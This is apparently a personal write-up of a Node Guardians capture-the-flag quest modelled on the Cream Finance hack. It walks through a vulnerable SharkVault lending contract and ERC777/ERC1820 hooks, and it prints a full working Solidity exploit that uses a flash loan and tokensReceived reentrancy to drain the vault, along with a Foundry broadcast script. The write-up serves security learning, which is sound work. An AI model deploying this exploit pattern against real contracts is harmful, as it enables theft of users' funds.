---
title: "Cream Finance Rekt"
date: "2024-02-14T14:27:00.000Z"
lastmod: "2024-02-14T14:47:00.000Z"
draft: false
featuredImage: "https://cdn.nodeguardians.io/backend-production/Cream_Rekt_part\
  1_1200px_812a079450/Cream_Rekt_part1_1200px_812a079450.webp"
weight: 2
difficulty: "🗡🗡🗡🗡"
language:
  - "Solidity"
level-url: "https://nodeguardians.io/dev-hub/quests/cream-rekt"
type: "default"
skill-cat:
  - "Security"
state: "Done"
about:
  - "reentrency"
  - "low-level calls"
NOTION_METADATA:
  object: "page"
  id: "04ac5f09-eb5d-42c0-b28f-cdd8aabdc19d"
  created_time: "2024-02-14T14:27:00.000Z"
  last_edited_time: "2024-02-14T14:47:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover:
    type: "external"
    external:
      url: "https://cdn.nodeguardians.io/backend-production/Cream_Rekt_part1_1200px_8\
        12a079450/Cream_Rekt_part1_1200px_812a079450.webp"
  icon:
    type: "emoji"
    emoji: "✅"
  parent:
    type: "database_id"
    database_id: "67ccfb28-aa7e-4248-9272-3d9732e4a83e"
  archived: false
  properties:
    weight:
      id: "%3BQ%60q"
      type: "number"
      number: 2
    difficulty:
      id: "%3DCqv"
      type: "status"
      status:
        id: "qV=s"
        name: "🗡🗡🗡🗡"
        color: "red"
    language:
      id: "Py%7Cy"
      type: "multi_select"
      multi_select:
        - id: "d01ac056-199f-4b78-96ee-583126c15462"
          name: "Solidity"
          color: "blue"
    level-url:
      id: "cjvw"
      type: "url"
      url: "https://nodeguardians.io/dev-hub/quests/cream-rekt"
    type:
      id: "khE_"
      type: "select"
      select:
        id: "_p~}"
        name: "default"
        color: "green"
    skill-cat:
      id: "n%7CzF"
      type: "multi_select"
      multi_select:
        - id: "8fe662a4-5f8b-4be9-8013-c00b51082782"
          name: "Security"
          color: "green"
    state:
      id: "sW%3AG"
      type: "status"
      status:
        id: "372c6056-56a9-4d05-861f-a165f80174eb"
        name: "Done"
        color: "green"
    about:
      id: "vf%7DG"
      type: "multi_select"
      multi_select:
        - id: "14a70ab5-75ce-4cdb-baad-c40de6b3d3ee"
          name: "reentrency"
          color: "default"
        - id: "417c6433-6e36-4f26-9d1b-87b840c4a8c8"
          name: "low-level calls"
          color: "green"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Cream Finance Rekt"
            link: null
          annotations:
            bold: true
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Cream Finance Rekt"
          href: null
  url: "https://www.notion.so/Cream-Finance-Rekt-04ac5f09eb5d42c0b28fcdd8aabdc19d"
  public_url: null
UPDATE_TIME: "2024-02-14T14:50:04.217Z"
EXPIRY_TIME: "2024-02-14T15:49:59.802Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


[https://rekt.news/cream-rekt/](https://rekt.news/cream-rekt/)


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/178ae4f1-c8c0-4d72-b2e0-4ea382dde02f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=0df741e5b7c59d728655fe24a2b7a14bbe0987434c23a12055cc4420b6336506&X-Amz-SignedHeaders=host&x-id=GetObject)


Flash Loan EIP : [https://eips.ethereum.org/EIPS/eip-3156](https://eips.ethereum.org/EIPS/eip-3156)


## Simple Summary


This ERC provides standard interfaces and processes for single-asset flash loans.


##  Abstract


A flash loan is a smart contract transaction in which a lender smart 
contract lends assets to a borrower smart contract with the condition 
that the assets are returned, plus an optional fee, before the end of 
the transaction. This ERC specifies interfaces for lenders to accept 
flash loan requests, and for borrowers to take temporary control of the 
transaction within the lender execution. The process for the safe 
execution of flash loans is also specified.


##  Motivation


Flash loans allow smart contracts to lend an amount of tokens without
 a requirement for collateral, with the condition that they must be 
returned within the same transaction.


Early adopters of the flash loan pattern have produced different 
interfaces and different use patterns. The diversification is expected 
to intensify, and with it the technical debt required to integrate with 
diverse flash lending patterns.


Some of the high level differences in the approaches across the protocols include:

- Repayment approaches at the end of the transaction, where some
pull the principal plus the fee from the loan receiver, and others where the loan receiver needs to manually return the principal and the fee to the lender.
- Some lenders offer the ability to repay the loan using a token
that is different to what was originally borrowed, which can reduce the
overall complexity of the flash transaction and gas fees.
- Some lenders offer a single entry point into the protocol
regardless of whether you’re buying, selling, depositing or chaining
them together as a flash loan, whereas other protocols offer discrete
entry points.
- Some lenders allow to flash mint any amount of their native token
without charging a fee, effectively allowing flash loans bounded by
computational constraints instead of asset ownership constraints.

![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/2beec3bf-2d47-445d-8dd0-30068879468f/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=2c732257b2b4f101f4f045273c7c4659020ba2c5d9ad4f890ebff7e31df172ae&X-Amz-SignedHeaders=host&x-id=GetObject)


First thing first, I want to have a look at the current state of the vault contract:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attack} from "../src/Attack.sol";

import {SharkVault, IERC20} from "../src/Attack.sol";

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address INSTANCE = vm.envAddress("INSTANCE");

        vm.startBroadcast(deployerPrivateKey);


        SharkVault vault = SharkVault(INSTANCE);

        IERC20 gold = IERC20(vault.gold());
        IERC20 seagold = IERC20(vault.seagold());

        console.logAddress(address(gold));
        console.logAddress(address(seagold));
        console.logUint(gold.balanceOf(address(vault)));
        console.logUint(seagold.balanceOf(address(vault)));


        vm.stopBroadcast();
    }
}
```


which gives me the following output :


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/d77a8fc9-bff8-4e31-8f60-59bb6cbce852/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=e14dd0caa3399d0a26aad0146cc90c9d6d726985c3c3a51af700b2dac45d9389&X-Amz-SignedHeaders=host&x-id=GetObject)


So this is our target to still !


Now here is the vault contract:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract SharkVault {

    // The Shark charges predatory interest rates...
    uint256 constant public INTEREST_RATE_PERCENT = 1;

    IERC20 immutable public gold;
    IERC20 immutable public seagold;

    struct LoanAccount {
        uint256 depositedGold;
        uint256 borrowedSeagold;
        uint256 lastBlock;
    }

    mapping(address => LoanAccount) private accounts;

    constructor(
        IERC20 _gold,
        IERC20 _seagold
    ) {
        gold =  _gold;
        seagold = _seagold;
    }

    /**
     * @notice Deposit gold as collateral. 
     * @param _amount Amount of gold to deposit.
     * @dev Gold must be approved for transfer beforehand.
     */
    function depositGold(uint256 _amount) external payable {

        accounts[msg.sender].depositedGold += _amount;
        gold.transferFrom(msg.sender, address(this), _amount);

    }

    /**
     * @notice Withdraw gold collateral.
     * @param _amount Amount of gold to withdraw.
     * @dev Any existing seagold loan must still be 
     * sufficiently collateralized.
     */
    function withdrawGold(uint256 _amount) external payable {

        LoanAccount memory account = updatedAccount(msg.sender);
        account.depositedGold -= _amount;

        require(_hasEnoughCollateral(account), "Undercollateralized $SEAGLD loan");
        accounts[msg.sender] = account;

        gold.transfer(msg.sender, _amount);

    }

    /**
     * @notice Borrow seagold.
     * @param _amount Amount of seagold to borrow.
     * @dev Seagold loan have be suffciently collateralized 
     * by previously deposited gold.
     */
    function borrow(uint256 _amount) external {

        LoanAccount memory borrowerAccount = updatedAccount(msg.sender);
        borrowerAccount.borrowedSeagold += _amount;

        // Fail if insufficient remaining balance of $SEAGOLD
        uint256 seagoldBalance = seagold.balanceOf(address(this));
        require(_amount <= seagoldBalance, "Insufficient $SEAGLD to lend");

        // Fail if borrower has insufficient gold collateral
        require(_hasEnoughCollateral(borrowerAccount), "Undercollateralized $SEAGLD loan");

        // Transfer $SEAGOLD and update records
        seagold.transfer(msg.sender, _amount);
        accounts[msg.sender] = borrowerAccount;

    }

    /**
     * @notice Repay borrowed seagold.
     * @param _amount Amount of seagold to repay.
     * @dev Seagold must be approved for transfer beforehand.
     */
    function repay(uint256 _amount) external {

        LoanAccount memory account = updatedAccount(msg.sender);
        account.borrowedSeagold -= _amount;
        accounts[msg.sender] = account;

        seagold.transferFrom(msg.sender, address(this), _amount);

    }

    /**
     * @notice Liquidate an existing undercollateralized loan. 
     * The smart contract effectively seizes the gold collateral.
     * @param _borrower Owner of the loan.
     */
    function liquidate(address _borrower) external {

        LoanAccount memory borrowerAccount = updatedAccount(_borrower);

        require(!_hasEnoughCollateral(borrowerAccount), "Borrower has good collateral");
        delete accounts[_borrower];

    }

    /**
     * @notice Get the loan account of a user, with updated interest.
     * @param _accountOwner Owner of the loan.
     */
    function updatedAccount(
        address _accountOwner
    ) public view returns (LoanAccount memory account) {

        account = accounts[_accountOwner];

        if (account.borrowedSeagold > 0) {
            uint256 blockDelta = block.number - account.lastBlock;
            uint256 interest = account.borrowedSeagold * blockDelta 
                * INTEREST_RATE_PERCENT / 100;

            account.depositedGold = (account.depositedGold >= interest) 
                ? account.depositedGold - interest 
                : 0;
        }

        account.lastBlock = block.number;

    }

    /**
     * @dev Returns true if `_account` is sufficiently collateralized by gold.
     * Collateral ratio => 1 GOLD : 0.75 SEAGOLD
     */
    function _hasEnoughCollateral(LoanAccount memory _account) private pure returns (bool) {

        return (3 * _account.depositedGold >= 4 * _account.borrowedSeagold);
        
    }


}
```


Since we are supposed to take advantage of a reentrancy attack, I’m looking for any miss ordered `[checks → internal state change → outside communication]` patern in the contract. In other word, I want to find something in the contract that update the internal state logic of the contract after talking with the outside world.


And here we have it :


```solidity
 function borrow(uint256 _amount) external {

        LoanAccount memory borrowerAccount = updatedAccount(msg.sender);
        borrowerAccount.borrowedSeagold += _amount;

        // Fail if insufficient remaining balance of $SEAGOLD
        uint256 seagoldBalance = seagold.balanceOf(address(this));
        require(_amount <= seagoldBalance, "Insufficient $SEAGLD to lend");

        // Fail if borrower has insufficient gold collateral
        require(_hasEnoughCollateral(borrowerAccount), "Undercollateralized $SEAGLD loan");

        // Transfer $SEAGOLD and update records
        seagold.transfer(msg.sender, _amount); <==================
        accounts[msg.sender] = borrowerAccount; <=================

    }
```


Those last two line are very dangerous since transfer can be done to any malicious contract that will recall the borrow function before the `accounnts[msg.sender]` state is updated!


The first line of the function calls `updatedAccount` :


```solidity
function updatedAccount(
        address _accountOwner
    ) public view returns (LoanAccount memory account) {

        account = accounts[_accountOwner];

        if (account.borrowedSeagold > 0) {
            uint256 blockDelta = block.number - account.lastBlock;
            uint256 interest = account.borrowedSeagold * blockDelta 
                * INTEREST_RATE_PERCENT / 100;

            account.depositedGold = (account.depositedGold >= interest) 
                ? account.depositedGold - interest 
                : 0;
        }

        account.lastBlock = block.number;

    }

```


but this call presuppose that `account = accounts[_accountOwner];` is the correct value, which we know is wrong since we can call withdraw as many time as we want without changing the `accounts[msg.sender]` . In order to create an attack, first we need so GOLD collateral. Let’s see how many GOLD we can borrow from the flash lender:


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/890f84cd-9c23-471d-91f8-eb71c84fa3df/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=9f405ad96fe241eef781c769df799b501f0954fa0203d18a50437ad8ae82365d&X-Amz-SignedHeaders=host&x-id=GetObject)


So, 1 000 Gold token.


And we want to still 3 000 SeaGold.


It is said that : For every `1000` Gold deposited, users can borrow up to `75` Seagold.


So we’ll be able to `borrow` 750 Seagold on each call which is perfet since 3 000 / 750 = 4 !


So, here are the step I’m going to implement;

1. Deposit the `1000` Gold from the Flashloan contract into the SharkVault contract
1. Call `borrow()` 750 SeaGold x4 thanks to the contract breach
1. Make a last `borrow()` of 0 SeaGold so I don’t have to repay anything
1. Withdraw the `1000` Gold from the SharkVault contract and repay back the Flashloan contract

Now it still remains one problem, how to take advantage of the seagold transfer method ?


looking at the decompiled version of the function from goerli scan :


```solidity
def transfer(address _to, uint256 _value) payable: 
  require calldata.size - 4 >=ΓÇ▓ 64
  require _to == _to
  require _value == _value
  if not caller:
      revert with 0, 'ERC777: transfer from the zero address'
  if not _to:
      revert with 0, 'ERC777: transfer to the zero address'
  static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with:
          gas gas_remaining wei
         args caller, 0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >=ΓÇ▓ 32
  require ext_call.return_data == ext_call.return_data[12 len 20]
  if ext_call.return_data[12 len 20]:
      require ext_code.size(addr(ext_call.return_data))
      call addr(ext_call.return_data).tokensToSend(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with:
           gas gas_remaining wei
          args caller, caller, addr(_to), _value, 192, 224, 0, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
  if balanceOf[caller] < _value:
      revert with 0, 'ERC777: transfer amount exceeds balance'
  balanceOf[caller] -= _value
  if balanceOf[addr(_to)] > balanceOf[addr(_to)] + _value:
      revert with 'NH{q', 17
  balanceOf[addr(_to)] += _value
  log Sent(address operator, address from, address to, uint256 amount, bytes holderData, bytes operatorData):
           _value,
           96,
           128,
           0,
           0,
           caller,
           caller,
           _to,
  log Transfer(
        address from=_value,
        address to=caller,
        uint256 tokens=_to)
  static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with:
          gas gas_remaining wei
         args addr(_to), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b
  if not ext_call.success:
      revert with ext_call.return_data[0 len return_data.size]
  require return_data.size >=ΓÇ▓ 32
  require ext_call.return_data == ext_call.return_data[12 len 20]
  if ext_call.return_data[12 len 20]:
      require ext_code.size(addr(ext_call.return_data))
      call addr(ext_call.return_data).tokensReceived(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with:
           gas gas_remaining wei
          args caller, caller, addr(_to), _value, 192, 224, 0, 0
      if not ext_call.success:
          revert with ext_call.return_data[0 len return_data.size]
  return 1
```


and the first transaction log from my first POC (see further below) we can see that their is some call to `getInterfaceImplementer()` function:


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/427c63e2-b8fe-4244-81c2-e8726a8c6a11/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=37073072cd8524543b85f2410bdf27666ccd24d685ffa517f89a47855feef6b1&X-Amz-SignedHeaders=host&x-id=GetObject)


Here is the correponding eip : [https://eips.ethereum.org/EIPS/eip-1820](https://eips.ethereum.org/EIPS/eip-1820)


## Simple Summary


This standard defines a universal registry smart contract where any 
address (contract or regular account) can register which interface it 
supports and which smart contract is responsible for its implementation.


This standard keeps backward compatibility with [ERC-165](https://eips.ethereum.org/EIPS/eip-165).


##  Abstract


This standard defines a registry where smart contracts and regular 
accounts can publish which functionality they implement—either directly 
or through a proxy contract.


Anyone can query this registry to ask if a specific address 
implements a given interface and which smart contract handles its 
implementation.


This registry MAY be deployed on any chain and shares the same address on all chains.


Interfaces with zeroes (`0`) as the last 28 bytes are considered [ERC-165](https://eips.ethereum.org/EIPS/eip-165) interfaces,
and this registry SHALL forward the call to the contract to see if it implements the interface.


This contract also acts as an [ERC-165](https://eips.ethereum.org/EIPS/eip-165) cache to reduce gas consumption.


##  Motivation


There have been different approaches to define pseudo-introspection in Ethereum.
The first is [ERC-165](https://eips.ethereum.org/EIPS/eip-165) which has the limitation that it cannot be used by regular accounts.
The second attempt is [ERC-672](https://github.com/ethereum/EIPs/issues/672) which uses reverse [ENS](https://ens.domains/). Using reverse [ENS](https://ens.domains/) has two issues. 
First, it is unnecessarily complicated, and second, [ENS](https://ens.domains/) is still a centralized contract controlled by a multisig.
This multisig theoretically would be able to modify the system.


This standard is much simpler than [ERC-672](https://github.com/ethereum/EIPs/issues/672), and it is _fully_ decentralized.


This standard also provides a _unique_ address for all chains.
Thus solving the problem of resolving the correct registry address for different chains.


Back to the decompiled code:


```solidity
static call 0x1820a4b7618bde71dce8cdc73aab6c95905fad24.getInterfaceImplementer(address addr, bytes32 interfaceHash) with:
          gas gas_remaining wei
         args addr(_to), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b
```


after a quick google search we can find that:


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/b85d9ee1-db3e-4f34-a986-0b8ab8f7f018/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=2466928149087a20615afe9318436f6bfc3222e17279cdaefb638f157f42af8c&X-Amz-SignedHeaders=host&x-id=GetObject)


[bookmark](https://docs.openzeppelin.com/contracts/3.x/erc777)


So apparently, Seagold is not just an ERC20 but rather an ERC777


The question is: How can we trigger a fallback like functionality from ERC777 transfer call ?


[https://ethereum.stackexchange.com/a/84702](https://ethereum.stackexchange.com/a/84702)


Here we have it :


[bookmark](https://github.com/Dawn-Protocol/dawn-erc20-erc777/blob/master/contracts/Staking.sol#L243)


We can clearly see here that if we implement the tokensReceived function we can have a re-entrancy attack:


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/a92b9812-e364-4481-a5e4-d551245477ff/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=2e578cd7fd967d050bc7be73bb3b2471c75991ed284b7ba46ba89fe65506dbad&X-Amz-SignedHeaders=host&x-id=GetObject)


So let’s implement the function in our flashloan contract + we can see that the address is called on  the return data which is the _to address from the params of the function which is msg.sender which is our flash loan contract !


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/ca7dfac6-2e86-42e5-91a2-a9ba70189cbe/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=2f6ff0c2c041abf0cc5e429135a48c2326fa03178962f4382080b6b7d79f1657&X-Amz-SignedHeaders=host&x-id=GetObject)


Once we have implemented the function there is still one thing to do:


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/a3c117a4-c87e-441e-81ee-8b43f01fa31c/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=4c53e0f8ae4885e179757a2b533958d16c0ce3ccc8e71e29b5a8c2502fe4e646&X-Amz-SignedHeaders=host&x-id=GetObject)


We can see that there is no interface implementer registered, so there are no call that is made here :


```solidity
if ext_call.return_data[12 len 20]:
      require ext_code.size(addr(ext_call.return_data))
      call addr(ext_call.return_data).tokensReceived(address param1, address param2, address param3, uint256 param4, bytes param5, bytes param6) with:
           gas gas_remaining wei
          args caller, caller, addr(_to), _value, 192, 224, 0, 0
```


ext_call.return_data is the result of getInterfaceImplementer.


So first we have to find a way to add an interface implementer in the ERC1830Registry.


We can do so with the following function:


```solidity
/// @notice Sets the contract which implements a specific interface for an address.
/// Only the manager defined for that address can set it.
/// (Each address is the manager for itself until it sets a new manager.)
/// @param _addr Address for which to set the interface.
/// (If '_addr' is the zero address then 'msg.sender' is assumed.)
/// @param _interfaceHash Keccak256 hash of the name of the interface as a string.
/// E.g., 'web3.utils.keccak256("ERC777TokensRecipient")' for the 'ERC777TokensRecipient' interface.
/// @param _implementer Contract address implementing '_interfaceHash' for '_addr'.
function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external {
    address addr = _addr == address(0) ? msg.sender : _addr;
    require(getManager(addr) == msg.sender, "Not the manager");

    require(!isERC165Interface(_interfaceHash), "Must not be an ERC165 hash");
    if (_implementer != address(0) && _implementer != msg.sender) {
        require(
            ERC1820ImplementerInterface(_implementer)
                .canImplementInterfaceForAddress(_interfaceHash, addr) == ERC1820_ACCEPT_MAGIC,
            "Does not implement the interface"
        );
    }
    interfaces[addr][_interfaceHash] = _implementer;
    emit InterfaceImplementerSet(addr, _interfaceHash, _implementer);
}
```


→ _addr (FlashLoan address)


→ _interfaceHash (0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b)


→ _interfaceHash (FlashLoan address)


So here is the call I made :


```solidity
ERC1820Registry registry = ERC1820Registry(REGISTRY);
registry.setInterfaceImplementer(address(flashLoan), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(flashLoan));
```


but I felt onto:


![](https://prod-files-secure.s3.us-west-2.amazonaws.com/00345c33-b7f7-443a-aca8-598247fb6d93/8df87b9b-3bbf-40b6-a273-28ceb0f98bd3/Untitled.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Content-Sha256=UNSIGNED-PAYLOAD&X-Amz-Credential=AKIAT73L2G45HZZMZUHI%2F20240214%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240214T144959Z&X-Amz-Expires=3600&X-Amz-Signature=dd5ed735e4cc7540305fc60ca70cab6cb6d00fe1e103b57a86a66b2c4ba8ea9f&X-Amz-SignedHeaders=host&x-id=GetObject)


Question: who is the manager ?


It turns out that a contract is its own manager ! hehe


So I moved my code inside my FlashLoan attacker 😈


And here is a first peek at my set up:


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// Here we can find the standard interface for the ERC20. Don't forget that we find
// out that the seagold is actually an ERC777 token !
interface IERC20 {
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

// This is the registry that tells for a given contract which interface its supports
// There is a getter and a setter.
// The manager of a contrat is the contract itself by default.
interface ERC1820Registry {
	function getInterfaceImplementer(address _addr, bytes32 _interfaceHash) external view returns (address);
  function setInterfaceImplementer(address _addr, bytes32 _interfaceHash, address _implementer) external;
}

// This is the vault we are going to attack
interface SharkVault {
    // The Shark charges predatory interest rates...
    function INTEREST_RATE_PERCENT() external returns(uint256);

    function gold() external returns(address);
    function seagold() external returns(address);

    struct LoanAccount {
        uint256 depositedGold;
        uint256 borrowedSeagold;
        uint256 lastBlock;
    }
    function depositGold(uint256 _amount) external ;
    function withdrawGold(uint256 _amount) external payable;
    function borrow(uint256 _amount) external;
    function repay(uint256 _amount) external;
    function liquidate(address _borrower) external;
    function updatedAccount(
        address _accountOwner
    ) external view returns (LoanAccount memory account);
}

// This is one of the interface of our attacker contract.
// onFlashLoan will be called by the FlashLender (see the next interface)
// when this function is called we actually have the gold token in the 
// attacker contract
interface IERC3156FlashBorrower {
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32);
}

// This one is the interface for the flash loan borrower.
// This is where we find the initial golds that will boostrap the whole attack
// and the ones that we have to repay at the end of the flashloan (+ fee) but there
// is no fees in this scenario.
interface IERC3156FlashLender {

    function maxFlashLoan(
        address token
    ) external view returns (uint256);

    function flashFee(
        address token,
        uint256 amount
    ) external view returns (uint256);

    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

// This is the second interface that our FlashLoan contract implement
// It is basically where the re-entrancy attack begins !
interface IERC777TokensRecipient {
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external;
}


// And there it is ! The FlashLoan attacker contract wich implements the whole
// attack logic
contract FlashLoan is IERC3156FlashBorrower, IERC777TokensRecipient {

    IERC20 gold;
    IERC20 seagold;
    IERC3156FlashLender flashLender;
    SharkVault vault;
    bool pwned;
    ERC1820Registry registry;

		// First, we get all the utilities we will need to access during the attack
    constructor(address _flashLender, address _gold, address _seagold, address _vault, address _registry) {
      gold = IERC20(_gold);
      seagold = IERC20(_seagold);
      flashLender = IERC3156FlashLender(_flashLender);
      vault = SharkVault(_vault);
      registry = ERC1820Registry(_registry);
    }

		// The attack is in two phases:
		// - 1) State that the contract implement the interface for the tokenReceived method
		//      in the ERC1820 registry
	  // - 2) Launch the actual attack starting with the flashloan on the Flash Lender contract
    function attack() public {
      registry.setInterfaceImplementer(address(0), 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b, address(this));
      uint maxAmount = flashLender.maxFlashLoan(address(gold));
      flashLender.flashLoan(this, address(gold), maxAmount, abi.encode(0));
    }

		// Once the loan is authorized by the Flash Lender it calls this function
    // on the our flash loan attacker contract
    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata 
    ) public returns (bytes32) {
			// Those are almost useless check
      require(initiator == address(this), 'Wrong initiator');
      require(token == address(gold), 'Not gold');
      require(fee == 0, 'Fee must be 0');

			// First we deposit the gold token into the vault as collateral
      require(gold.approve(address(vault), amount));
      vault.depositGold(amount);
			
			// Then we borrow some seagold
			// if everyting is fine the function to be called is tokenReceived down
			// bellow
			// The first borrow is intentionally of 0 since when we are going to 
			// depop from the stack it's going to be the last value... So we'll
			// have nothing to repay in order to leave the shark vault :)
      vault.borrow(0 ether);
			
			// This is called only once the recursion is over
			// And it correspond to the withdrawing of the collateral from the 
			// shark vault
      vault.withdrawGold(amount);
			
			// Finally we can approve the gold transfer in order to repay the initial
			// loan made to the Flash Lender !
      require(gold.approve(address(flashLender), amount));
			// And don't forget to return the expected hash:
      return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function tokensReceived(
      address,
      address,
      address,
      uint256 ,
      bytes calldata,
      bytes calldata
    ) external {
      uint amount = seagold.balanceOf(address(vault));
			// classic recursion pattern to prevent infinte loop
      if (amount == 0) {
        return;
      }
			// since there is 1000 ether of collateral 750 is the max amount we can borrow
      vault.borrow(750 ether);
    }

}
```


And here is the deployment script:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";


import {SharkVault, IERC20, FlashLoan} from "../src/Attack.sol";

contract POC is Script {
    function run() external {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address INSTANCE = vm.envAddress("INSTANCE");
        address FLASH_LENDER = vm.envAddress("FLASH_LENDER");
        address REGISTRY = vm.envAddress("ERC1820REGISTRY");

        vm.startBroadcast(deployerPrivateKey);

        SharkVault vault = SharkVault(INSTANCE);

        IERC20 gold = IERC20(vault.gold());
        IERC20 seagold = IERC20(vault.seagold());

        FlashLoan flashLoan = new FlashLoan(FLASH_LENDER, address(gold), address(seagold), address(vault), REGISTRY);

        console.logAddress(address(gold));
        console.logAddress(address(seagold));
        console.logUint(gold.balanceOf(address(vault)));
        console.logUint(seagold.balanceOf(address(vault)));

        flashLoan.attack();

        console.logUint(seagold.balanceOf(address(vault)));

        vm.stopBroadcast();
    }
}
```


```solidity
